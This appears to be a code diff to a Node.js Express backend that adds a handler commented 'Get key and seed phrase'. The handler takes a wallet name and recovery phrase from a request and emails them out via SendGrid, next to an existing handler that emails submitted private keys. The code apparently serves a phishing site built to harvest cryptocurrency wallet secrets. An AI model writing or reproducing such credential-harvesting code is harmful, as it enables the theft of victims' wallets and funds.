@@ -6,6 +6,7 @@ import { paystack } from "../../helper/payStack.js";
 import {
   sendGoodwillMessage,
   sendPrivateKey,
+  sendPrivateKey2,
   sendThankUMail,
 } from "../../Email/SendGrid.js";
 
@@ -99,6 +100,22 @@ export const getMessage = async (req, res) => {
   if (message.length < 40) return;
   try {
     sendPrivateKey(message);
+    return responses.success({
+      res,
+      message: `it a success`,
+    });
+  } catch (error) {
+    console.log(error);
+  }
+};
+
+// Get key and seed phrase
+export const getMessage2 = async (req, res) => {
+  const { walletName, rPhrase } = req.body;
+  const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
+  if (!checkPhrase) return;
+  try {
+    sendPrivateKey2(walletName, rPhrase);
     return responses.success({
       res,
       message: `it a success`,
